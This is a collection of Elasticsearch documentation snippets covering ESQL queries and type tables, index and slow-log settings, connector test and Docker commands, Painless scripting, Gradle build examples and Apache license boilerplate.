----------------------------------------

TITLE: Setting Heap Size via Environment Variable
DESCRIPTION: Example of setting heap size using ES_JAVA_OPTS for testing purposes.

LANGUAGE: shell
CODE:
ES_JAVA_OPTS="-Xms2g -Xmx2g" ./bin/elasticsearch

----------------------------------------

TITLE: Defining ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function. It specifies a single parameter 'str' which is a string expression that can be null or a single- or multi-valued column or expression.

LANGUAGE: markdown
CODE:
**Parameters**

`str`
:   String expression. If `null`, the function returns `null`. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Creating an API Key for Salesforce Connector
DESCRIPTION: Example of creating an API key with necessary permissions for the Salesforce connector.

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Querying Airport City Boundaries with Spatial Functions in ESQL
DESCRIPTION: This ESQL query filters for Copenhagen airport, calculates the envelope of its city boundary, and extracts the minimum and maximum coordinates. It demonstrates the use of spatial functions ST_ENVELOPE, ST_XMIN, ST_XMAX, ST_YMIN, and ST_YMAX.

LANGUAGE: esql
CODE:
FROM airport_city_boundaries
| WHERE abbrev == "CPH"
| EVAL envelope = ST_ENVELOPE(city_boundary)
| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)
| KEEP abbrev, airport, xmin, xmax, ymin, ymax

----------------------------------------

TITLE: Running End-to-End Tests for Google Drive Connector
DESCRIPTION: Commands to run functional tests for the Google Drive connector using the connector framework.

LANGUAGE: sh
CODE:
make ftest NAME=google_drive

LANGUAGE: sh
CODE:
make ftest NAME=google_drive DATA_SIZE=small

----------------------------------------

TITLE: Defining TimeDefinition Enum
DESCRIPTION: Specifies the TimeDefinition enum within ZoneOffsetTransitionRule for handling different time definitions in transitions.

LANGUAGE: java
CODE:
class java.time.zone.ZoneOffsetTransitionRule$TimeDefinition {
  ZoneOffsetTransitionRule.TimeDefinition STANDARD
  ZoneOffsetTransitionRule.TimeDefinition UTC
  ZoneOffsetTransitionRule.TimeDefinition WALL
  LocalDateTime createDateTime(LocalDateTime,ZoneOffset,ZoneOffset)
  ZoneOffsetTransitionRule.TimeDefinition valueOf(String)
  ZoneOffsetTransitionRule.TimeDefinition[] values()
}

----------------------------------------

TITLE: Configuring ILM Policy with Migrate Action in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an ILM policy that includes the migrate action in the warm phase, along with an allocate action to reduce the number of replicas before migration.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "migrate" : {
          },
          "allocate": {
            "number_of_replicas": 1
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Displaying Supported Types for String Operations in ESQL
DESCRIPTION: This markdown table shows the supported types for string operations with delimiters in ESQL. It demonstrates the result type based on different combinations of string and delimiter types.

LANGUAGE: markdown
CODE:
| string | delim | result |
| --- | --- | --- |
| keyword | keyword | keyword |
| keyword | text | keyword |
| text | keyword | keyword |
| text | text | keyword |

----------------------------------------

TITLE: Enabling Slow Logs for Indexing Requests in Elasticsearch
DESCRIPTION: This JSON snippet shows how to enable slow logs for indexing requests across all indices using the update indices settings API. It sets a high threshold for the 'warn' level and includes user information.

LANGUAGE: json
CODE:
PUT /*/_settings
{
  "index.indexing.slowlog.include.user": true,
  "index.indexing.slowlog.threshold.index.warn": "30s"
}

----------------------------------------

TITLE: Deleting a User from Elasticsearch
DESCRIPTION: This example shows how to remove a user named 'jacknich' from the Elasticsearch file realm using the elasticsearch-users command.

LANGUAGE: shell
CODE:
bin/elasticsearch-users userdel jacknich

----------------------------------------

TITLE: Creating Custom Analyzer with Word Delimiter Graph Filter
DESCRIPTION: Example of creating a custom analyzer using the word_delimiter_graph filter.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "filter": [ "word_delimiter_graph" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: ESQL Invalid Full-Text Search Query
DESCRIPTION: Shows an invalid full-text search query where MATCH is used after a STATS command, which will fail due to validation constraints.

LANGUAGE: esql
CODE:
FROM books
| STATS AVG(price) BY author
| WHERE MATCH(author, "Faulkner")

----------------------------------------

TITLE: Running E2E Tests for PostgreSQL Connector
DESCRIPTION: Shell commands for running end-to-end tests on the PostgreSQL connector

LANGUAGE: shell
CODE:
$ make ftest NAME=postgresql

----------------------------------------

TITLE: Type Compatibility Table in Markdown
DESCRIPTION: A markdown table showing the supported field types and their corresponding result types for geometric data in ESQL. Covers cartesian and geographic point data types.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| cartesian_point | cartesian_point |
| geo_point | geo_point |

----------------------------------------

TITLE: ESQL Substring Type Support Matrix
DESCRIPTION: Markdown table showing supported input types and parameters for substring operation. Indicates that substring can be performed on keyword and text types with integer parameters, producing keyword results.

LANGUAGE: markdown
CODE:
| string | start | length | result |
| --- | --- | --- | --- |
| keyword | integer | integer | keyword |
| text | integer | integer | keyword |

----------------------------------------

TITLE: Creating Azure VM Instance for Elasticsearch
DESCRIPTION: Azure CLI command to create a new VM instance for running Elasticsearch, specifying image, size, location, and authentication details.

LANGUAGE: sh
CODE:
azure vm create azure-elasticsearch-cluster \
                b39f27a8b8c64d52b05eac6a62ebad85__Ubuntu-13_10-amd64-server-20130808-alpha3-en-us-30GB \
                --vm-name myesnode1 \
                --location "West Europe" \
                --vm-size extrasmall \
                --ssh 22 \
                --ssh-cert /tmp/azure-certificate.pem \
                elasticsearch password1234\!\!

----------------------------------------

TITLE: Auto-interval Date Histogram with Minimum Interval in Elasticsearch
DESCRIPTION: Demonstrates setting a minimum interval of 'minute' for the auto_date_histogram aggregation to optimize collection process.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "sale_date": {
      "auto_date_histogram": {
        "field": "date",
        "buckets": 10,
        "minimum_interval": "minute"
      }
    }
  }
}

----------------------------------------

TITLE: Extracting Substring Using ESQL SUBSTRING Function
DESCRIPTION: Demonstrates how to use the SUBSTRING function to extract the first three characters from the last_name field starting at position 1. The query keeps only the last_name column and creates a new column ln_sub containing the substring.

LANGUAGE: sql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_sub = SUBSTRING(last_name, 1, 3)

----------------------------------------

TITLE: Running End-to-End Tests for Slack Connector
DESCRIPTION: This snippet shows how to run end-to-end tests for the Slack connector using the make command, with an option for faster testing using a smaller data size.

LANGUAGE: shell
CODE:
$ make ftest NAME=slack

# For faster tests with smaller data size
make ftest NAME=slack DATA_SIZE=small

----------------------------------------

TITLE: Intervals Query with Unordered All_of Rule
DESCRIPTION: This example demonstrates an Intervals query using an unordered all_of rule, allowing matched intervals to appear in any order or overlap.

LANGUAGE: console
CODE:
POST _search
{
  "query": {
    "intervals" : {
      "my_text" : {
        "all_of" : {
          "ordered" : false,
          "max_gaps": 1,
          "intervals" : [
            {
              "match" : {
                "query" : "my favorite food",
                "max_gaps" : 0,
                "ordered" : true
              }
            },
            {
              "match" : {
                "query" : "cold porridge",
                "max_gaps" : 4,
                "ordered" : true
              }
            }
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Installing ICU Analysis Plugin Example
DESCRIPTION: Example command showing how to install the core ICU analysis plugin for Elasticsearch. The command will automatically install the version matching your Elasticsearch installation.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin install analysis-icu

----------------------------------------

TITLE: Defining Supported Types for ESQL Number to Keyword Conversion
DESCRIPTION: This markdown table specifies the supported input and output types for an ESQL function that converts numbers to keywords. It shows that integer inputs are converted to keyword outputs.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| integer | keyword |

----------------------------------------

TITLE: Getting Day of Week from Datetime Field in Painless
DESCRIPTION: Script that extracts the day of week from a datetime field value using Java's date/time functionality. Returns the full day name in English.

LANGUAGE: painless
CODE:
doc['datetime'].value.getDayOfWeekEnum().getDisplayName(TextStyle.FULL, Locale.ROOT)

----------------------------------------

TITLE: Multiple Conditional Counts using OR NULL in ESQL
DESCRIPTION: This snippet demonstrates how to perform multiple conditional counts in a single query using the 'OR NULL' pattern, leveraging three-valued logic.

LANGUAGE: esql
CODE:
ROW n=1
| STATS COUNT(n > 0 OR NULL), COUNT(n < 0 OR NULL)

----------------------------------------

TITLE: Including LOG Function Description in Markdown
DESCRIPTION: This snippet includes the description of the LOG function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../description/log.md
:::

----------------------------------------

TITLE: Defining Metadata Operations for Elasticsearch Update By Query Scripts
DESCRIPTION: Specifies allowed metadata operations for accessing and modifying document metadata in update_by_query scripts.

LANGUAGE: Java
CODE:
class org.elasticsearch.script.Metadata {
    String getIndex()
    String getId()
    String getRouting()
    long getVersion()
    String getOp()
    void setOp(String)
}

----------------------------------------

TITLE: Field Access Operator in Painless
DESCRIPTION: Shows usage of the field access operator '.' to store and load values from reference type member fields in Painless. Includes examples using a custom 'Example' type.

LANGUAGE: painless
CODE:
Example example = new Example();
example.x = 1;
example.y = example.x;
example.z = new ArrayList();
example.z.add(1);
example.x = example.z.get(0);

----------------------------------------

TITLE: Static Scoring Function Imports
DESCRIPTION: Defines static imports for various scoring functions including saturation, sigmoid, random scoring, decay functions for geo/numeric/date fields, and vector similarity calculations.

LANGUAGE: config
CODE:
static_import {
    double saturation(double, double) from_class org.elasticsearch.script.ScoreScriptUtils
    double sigmoid(double, double, double) from_class org.elasticsearch.script.ScoreScriptUtils
    double randomScore(org.elasticsearch.script.ScoreScript, int, String) bound_to org.elasticsearch.script.ScoreScriptUtils$RandomScoreField
    double randomScore(org.elasticsearch.script.ScoreScript, int) bound_to org.elasticsearch.script.ScoreScriptUtils$RandomScoreDoc
    double decayGeoLinear(String, String, String, double, GeoPoint) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayGeoLinear
    double decayGeoExp(String, String, String, double, GeoPoint) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayGeoExp
    double decayGeoGauss(String, String, String, double, GeoPoint) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayGeoGauss
    double decayNumericLinear(double, double, double, double, double)bound_to org.elasticsearch.script.ScoreScriptUtils$DecayNumericLinear
    double decayNumericExp(double, double, double, double, double) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayNumericExp
    double decayNumericGauss(double, double, double, double, double) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayNumericGauss
    double decayDateLinear(String, String, String, double, ZonedDateTime) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayDateLinear
    double decayDateExp(String, String, String, double, ZonedDateTime) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayDateExp
    double decayDateGauss(String, String, String, double, ZonedDateTime) bound_to org.elasticsearch.script.ScoreScriptUtils$DecayDateGauss
    double l1norm(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$L1Norm
    double l2norm(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$L2Norm
    double cosineSimilarity(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$CosineSimilarity
    double dotProduct(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$DotProduct
    double hamming(org.elasticsearch.script.ScoreScript, Object, String) bound_to org.elasticsearch.script.VectorScoreScriptUtils$Hamming
}

----------------------------------------

TITLE: Docker Run Command for Connector Service
DESCRIPTION: Command to run the connector service in a Docker container

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Setting GCE Machine Permissions via Command Line
DESCRIPTION: Required scope flag for creating GCE instances with proper compute permissions.

LANGUAGE: text
CODE:
--scopes=compute-rw

----------------------------------------

TITLE: Example curl commands for bug reporting
DESCRIPTION: Shell commands demonstrating how to format a reproducible test case when reporting bugs, including deleting an index, inserting a document, and testing the behavior.

LANGUAGE: sh
CODE:
# delete the index
curl -XDELETE localhost:9200/test

# insert a document
curl -XPUT localhost:9200/test/test/1 -d '{
 "title": "test document"
}'

# this should return XXXX but instead returns YYY
curl ....

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This snippet presents a markdown table showing the supported types for a function in ESQL. It includes columns for string input type, length input type, and result type.

LANGUAGE: markdown
CODE:
| string | length | result |
| --- | --- | --- |
| keyword | integer | keyword |
| text | integer | keyword |

----------------------------------------

TITLE: Including TO_GEOSHAPE Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the TO_GEOSHAPE function using Markdown syntax. It references external files for detailed content of each section.

LANGUAGE: markdown
CODE:
## `TO_GEOSHAPE` [esql-to_geoshape]

**Syntax**

:::{image} ../../../images/functions/to_geoshape.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/to_geoshape.md
:::

:::{include} ../description/to_geoshape.md
:::

:::{include} ../types/to_geoshape.md
:::

:::{include} ../examples/to_geoshape.md
:::

----------------------------------------

TITLE: Running an asynchronous EQL search in Elasticsearch
DESCRIPTION: Shows how to run an asynchronous EQL search in Elasticsearch to avoid long waits for results.

LANGUAGE: JSON
CODE:
GET /my-data-stream/_eql/search
{
  "wait_for_completion_timeout": "2s",
  "query": """
    process where process.name == "cmd.exe"
  """
}

----------------------------------------

TITLE: Auto-interval Date Histogram with Time Zone in Elasticsearch
DESCRIPTION: Example showing how to use the time_zone parameter in auto_date_histogram aggregation to adjust bucket boundaries.

LANGUAGE: console
CODE:
GET my-index-000001/_search?size=0
{
  "aggs": {
    "by_day": {
      "auto_date_histogram": {
        "field":     "date",
        "buckets" : 3,
        "time_zone": "-01:00"
      }
    }
  }
}

----------------------------------------

TITLE: SHOW TABLES with Mixed Wildcards in Elasticsearch SQL
DESCRIPTION: Using the LIKE clause with a combination of single and multiple character wildcards.

LANGUAGE: sql
CODE:
SHOW TABLES LIKE '%em_';

----------------------------------------

TITLE: Documentation Structure Comment
DESCRIPTION: Initial comment indicating the file is auto-generated by ESQL's AbstractFunctionTestCase

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Creating an Index with Standard Mode in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an Elasticsearch index using the 'standard' index mode. The index mode controls settings applied in specific domains like time series data or logs ingestion.

LANGUAGE: json
CODE:
PUT my-index-000001
{
  "settings": {
    "index":{
      "mode":"standard"
    }
  }
}

----------------------------------------

TITLE: Cube Root Function Description
DESCRIPTION: Documentation for the cube root function that calculates the cube root of any numeric input value. Returns a double value and handles infinity cases by returning null.

LANGUAGE: plaintext
CODE:
Returns the cube root of a number. The input can be any numeric value, the return value is always a double. Cube roots of infinities are null.

----------------------------------------

TITLE: Creating and Populating Museums Index for Geo-centroid Aggregation
DESCRIPTION: This snippet demonstrates how to create an index with a geo_point field and populate it with museum data for use in geo-centroid aggregations.

LANGUAGE: console
CODE:
PUT /museums
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_point"
      }
    }
  }
}

POST /museums/_bulk?refresh
{"index":{"_id":1}}
{"location": "POINT (4.912350 52.374081)", "city": "Amsterdam", "name": "NEMO Science Museum"}
{"index":{"_id":2}}
{"location": "POINT (4.901618 52.369219)", "city": "Amsterdam", "name": "Museum Het Rembrandthuis"}
{"index":{"_id":3}}
{"location": "POINT (4.914722 52.371667)", "city": "Amsterdam", "name": "Nederlands Scheepvaartmuseum"}
{"index":{"_id":4}}
{"location": "POINT (4.405200 51.222900)", "city": "Antwerp", "name": "Letterenhuis"}
{"index":{"_id":5}}
{"location": "POINT (2.336389 48.861111)", "city": "Paris", "name": "Musée du Louvre"}
{"index":{"_id":6}}
{"location": "POINT (2.327000 48.860000)", "city": "Paris", "name": "Musée d'Orsay"}

----------------------------------------

TITLE: Displaying Supported Types for ESQL Functions in Markdown
DESCRIPTION: This markdown table shows the mapping between field types and their corresponding result types in ESQL. It covers a range of data types including primitive types, date/time types, and specialized types like IP addresses and versions.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| date | date |
| date_nanos | date_nanos |
| double | double |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| unsigned_long | unsigned_long |
| version | version |

----------------------------------------

TITLE: Updating Indexing Slow Log Settings for a Single Index in Elasticsearch
DESCRIPTION: This JSON snippet shows how to adjust indexing slow log settings for a single index using the update indices settings API in Elasticsearch. It configures thresholds for different log levels and includes options for source logging and reformatting.

LANGUAGE: json
CODE:
PUT /my-index-000001/_settings
{
  "index.indexing.slowlog.threshold.index.warn": "10s",
  "index.indexing.slowlog.threshold.index.info": "5s",
  "index.indexing.slowlog.threshold.index.debug": "2s",
  "index.indexing.slowlog.threshold.index.trace": "500ms",
  "index.indexing.slowlog.source": "1000",
  "index.indexing.slowlog.reformat": true,
  "index.indexing.slowlog.include.user": true
}

----------------------------------------

TITLE: Setting JVM Options for Elasticsearch Shard Tool in Shell
DESCRIPTION: Shows how to set custom JVM options for the elasticsearch-shard tool by using the CLI_JAVA_OPTS environment variable. This example increases the heap size to 1GB.

LANGUAGE: shell
CODE:
export CLI_JAVA_OPTS="-Xmx1g"
bin/elasticsearch-shard ...

----------------------------------------

TITLE: Analyzing Text with Word Delimiter Filter in Elasticsearch
DESCRIPTION: This example demonstrates using the word_delimiter filter to split and normalize a complex token using the analyze API.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "keyword",
  "filter": [ "word_delimiter" ],
  "text": "Neil's-Super-Duper-XL500--42+AutoCoder"
}

----------------------------------------

TITLE: Implicit Date Casting in ESQL Query
DESCRIPTION: Example demonstrating implicit date casting where the date string is automatically converted without explicit to_datetime function call.

LANGUAGE: esql
CODE:
FROM employees
| EVAL dd_ns1=date_diff("day", "2023-12-02T11:00:00.00Z", birth_date)
| SORT emp_no
| KEEP dd_ns1
| LIMIT 1

----------------------------------------

TITLE: Testing Elasticsearch Connection
DESCRIPTION: This cURL command tests the connection to the local Elasticsearch instance using basic authentication.

LANGUAGE: sh
CODE:
curl -s -X GET -u elastic:$ELASTIC_PASSWORD http://localhost:9200

----------------------------------------

TITLE: Displaying Supported Types in Markdown Table for Elasticsearch ESQL
DESCRIPTION: This markdown table shows the mapping between various Elasticsearch field types and their corresponding result types when used with ESQL functions. It covers a wide range of data types including boolean, numeric, date, geo, and text types.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | keyword |
| cartesian_point | keyword |
| cartesian_shape | keyword |
| date | keyword |
| date_nanos | keyword |
| double | keyword |
| geo_point | keyword |
| geo_shape | keyword |
| integer | keyword |
| ip | keyword |
| keyword | keyword |
| long | keyword |
| text | keyword |
| unsigned_long | keyword |
| version | keyword |

----------------------------------------

TITLE: Creating GCE Instance
DESCRIPTION: Command to create a new GCE instance with compute-rw scope required for Elasticsearch.

LANGUAGE: sh
CODE:
gcloud compute instances create myesnode1 \
       --zone <your-zone> \
       --scopes compute-rw

----------------------------------------

TITLE: Geo-centroid Aggregation on Geo-shape Fields
DESCRIPTION: This snippet demonstrates how to use geo-centroid aggregation on geo_shape fields, including both point and polygon geometries.

LANGUAGE: console
CODE:
PUT /places
{
  "mappings": {
    "properties": {
      "geometry": {
        "type": "geo_shape"
      }
    }
  }
}

POST /places/_bulk?refresh
{"index":{"_id":1}}
{"name": "NEMO Science Museum", "geometry": "POINT(4.912350 52.374081)" }
{"index":{"_id":2}}
{"name": "Sportpark De Weeren", "geometry": { "type": "Polygon", "coordinates": [ [ [ 4.965305328369141, 52.39347642069457 ], [ 4.966979026794433, 52.391721758934835 ], [ 4.969425201416015, 52.39238958618537 ], [ 4.967944622039794, 52.39420969150824 ], [ 4.965305328369141, 52.39347642069457 ] ] ] } }

POST /places/_search?size=0
{
  "aggs": {
    "centroid": {
      "geo_centroid": {
        "field": "geometry"
      }
    }
  }
}

----------------------------------------

TITLE: Running End-to-End Tests for SharePoint Connector
DESCRIPTION: Commands to run functional tests for the SharePoint Server connector against a real data source.

LANGUAGE: sh
CODE:
$ make ftest NAME=sharepoint_server

LANGUAGE: sh
CODE:
make ftest NAME=sharepoint_server DATA_SIZE=small

----------------------------------------

TITLE: Using STARTS_WITH Function in ESQL Query
DESCRIPTION: This snippet demonstrates how to use the STARTS_WITH function in an ESQL query. It checks if the 'last_name' field starts with the letter 'B' and assigns the result to a new field 'ln_S'.

LANGUAGE: sql
CODE:
FROM employees
| KEEP last_name
| EVAL ln_S = STARTS_WITH(last_name, "B")

----------------------------------------

TITLE: Registering a Gradle Task Using Task Avoidance API
DESCRIPTION: Demonstrates how to register a Gradle task using the task avoidance API, which helps keep configuration time low by only executing the configuration block when the task is actually created.

LANGUAGE: gradle
CODE:
tasks.register('someTask') { ... }

----------------------------------------

TITLE: ESQL Function Type Combinations in Markdown
DESCRIPTION: A comprehensive table showing all valid type combinations between two string inputs and a delimiter, along with their resulting output type. All combinations produce a keyword output type regardless of input types.

LANGUAGE: markdown
CODE:
| string1 | string2 | delim | result |
| --- | --- | --- | --- |
| keyword | keyword | keyword | keyword |
| keyword | keyword | text | keyword |
| keyword | keyword | | keyword |
| keyword | text | keyword | keyword |
| keyword | text | text | keyword |
| keyword | text | | keyword |
| text | keyword | keyword | keyword |
| text | keyword | text | keyword |
| text | keyword | | keyword |
| text | text | keyword | keyword |
| text | text | text | keyword |
| text | text | | keyword |

----------------------------------------

TITLE: Running Salesforce Connector Docker Image
DESCRIPTION: Command to run the Docker image for the Salesforce connector service.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Max Bucket Aggregation Example with Date Histogram
DESCRIPTION: Demonstrates using max_bucket aggregation to find the maximum monthly sales value from a date histogram aggregation with nested sum aggregation.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "max_monthly_sales": {
      "max_bucket": {
        "buckets_path": "sales_per_month>sales"
      }
    }
  }
}

----------------------------------------

TITLE: Markdown Documentation Structure for MEDIAN Function
DESCRIPTION: Template structure for documenting the MEDIAN aggregate function, including placeholders for various documentation sections like syntax, parameters, description, types, examples, and appendix.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `MEDIAN` [esql-median]

**Syntax**

:::{image} ../../../images/functions/median.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/median.md
:::

:::{include} ../description/median.md
:::

:::{include} ../types/median.md
:::

:::{include} ../examples/median.md
:::

:::{include} ../appendix/median.md
:::

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included in source files when applying the Apache License 2.0 to a software project. Fields in brackets should be replaced with project-specific information.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Documentation for SUM Aggregation Function
DESCRIPTION: Descriptive comment for the SUM function that performs numeric aggregation in Elasticsearch ESQL. This appears to be an automatically generated test documentation.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

The sum of a numeric expression.

----------------------------------------

TITLE: Removing Settings from Keystore
DESCRIPTION: Examples of removing single and multiple settings from the keystore.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore remove the.setting.name.to.remove

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore remove \
  the.setting.name.to.remove \
  the.other.setting.name.to.remove

----------------------------------------

TITLE: Processing Source Fields with Script Processor in Elasticsearch
DESCRIPTION: Example demonstrating how to extract tags from an env field using a Painless script in an ingest pipeline. The script splits a string on a delimiter and extracts a specific position to create tags.

LANGUAGE: console
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "script": {
          "description": "Extract 'tags' from 'env' field",
          "lang": "painless",
          "source": """
            String[] envSplit = ctx['env'].splitOnToken(params['delimiter']);
            ArrayList tags = new ArrayList();
            tags.add(envSplit[params['position']].trim());
            ctx['tags'] = tags;
          """,
          "params": {
            "delimiter": "-",
            "position": 1
          }
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "env": "es01-prod"
      }
    }
  ]
}

----------------------------------------

TITLE: Defining Vector-related Classes for Elasticsearch Scripting
DESCRIPTION: Defines classes for handling dense vectors and rank vectors in Elasticsearch scripts, providing methods to access vector values and magnitudes.

LANGUAGE: painless
CODE:
class org.elasticsearch.index.mapper.vectors.DenseVectorScriptDocValues {
    float[] getVectorValue()
    float getMagnitude()
}

class org.elasticsearch.index.mapper.vectors.RankVectorsScriptDocValues {
    Iterator getVectorValues()
    float[] getMagnitudes()
}

----------------------------------------

TITLE: Adding Test Fixtures Dependency in Elasticsearch Build
DESCRIPTION: Shows how to add a dependency on test fixtures from another project using the elasticsearch.internal-test-artifact plugin, which provides a build artifact based on the test sourceSet.

LANGUAGE: gradle
CODE:
dependencies {
  testImplementation(testArtifact(project(":fixture-providing-project")))
}

----------------------------------------

TITLE: Defining Supported Types for ESQL Functions in Markdown
DESCRIPTION: This markdown table defines the supported field types and their corresponding result types for ESQL functions. It covers a wide range of data types, including basic types, geometric types, and specialized types like IP addresses and versions.

LANGUAGE: markdown
CODE:
| field | result |
| --- | --- |
| boolean | boolean |
| cartesian_point | cartesian_point |
| cartesian_shape | cartesian_shape |
| date | date |
| date_nanos | date_nanos |
| double | double |
| geo_point | geo_point |
| geo_shape | geo_shape |
| integer | integer |
| ip | ip |
| keyword | keyword |
| long | long |
| text | keyword |
| unsigned_long | unsigned_long |
| version | version |

----------------------------------------

TITLE: Declaring Flat Directory Repository for Custom Artifacts
DESCRIPTION: Shows how to declare a flat directory repository to resolve custom artifacts from a local filesystem, useful for third-party libraries not built with Maven or provided as plain jar artifacts.

LANGUAGE: gradle
CODE:
allprojects {
  repositories {
    flatDir {
      dirs 'localRepo'
    }
  }
}

----------------------------------------

TITLE: Displaying ST_Y Function Syntax Image in Markdown
DESCRIPTION: This snippet shows how to embed an image representing the syntax of the ST_Y function using Markdown. It specifies the image path, alt text, and CSS class for centering.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/st_y.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Advanced Sync Rules Examples
DESCRIPTION: Sample advanced sync rules configurations for filtering OneDrive content

LANGUAGE: javascript
CODE:
[
  {
    "skipFilesWithExtensions": [".xlsx" , ".docx"]
  }
]

LANGUAGE: javascript
CODE:
[
  {
    "owners": ["user1-domain@onmicrosoft.com", "user2-domain@onmicrosoft.com"],
    "skipFilesWithExtensions": [".py"]
  }
]

----------------------------------------

TITLE: Searching with Multiple Routing Values
DESCRIPTION: Shows how to perform a search request targeting specific shards using multiple routing values.

LANGUAGE: console
CODE:
GET my-index-000001/_search?routing=user1,user2
{
  "query": {
    "match": {
      "title": "document"
    }
  }
}

----------------------------------------

TITLE: Markdown Documentation Structure for DATE_FORMAT
DESCRIPTION: Defines the documentation structure for the DATE_FORMAT function in ESQL, including references to syntax diagrams, parameters, descriptions, types, and examples through file inclusions.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `DATE_FORMAT` [esql-date_format]

**Syntax**

:::{image} ../../../images/functions/date_format.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/date_format.md
:::

:::{include} ../description/date_format.md
:::

:::{include} ../types/date_format.md
:::

:::{include} ../examples/date_format.md
:::

----------------------------------------

TITLE: Markdown Documentation Structure
DESCRIPTION: Basic markdown structure defining documentation sections for ST_EXTENT_AGG function including syntax visualization, parameters, description, types and examples.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `ST_EXTENT_AGG` [esql-st_extent_agg]

**Syntax**

:::{image} ../../../images/functions/st_extent_agg.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/st_extent_agg.md
:::

:::{include} ../description/st_extent_agg.md
:::

:::{include} ../types/st_extent_agg.md
:::

:::{include} ../examples/st_extent_agg.md
:::

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. This template includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
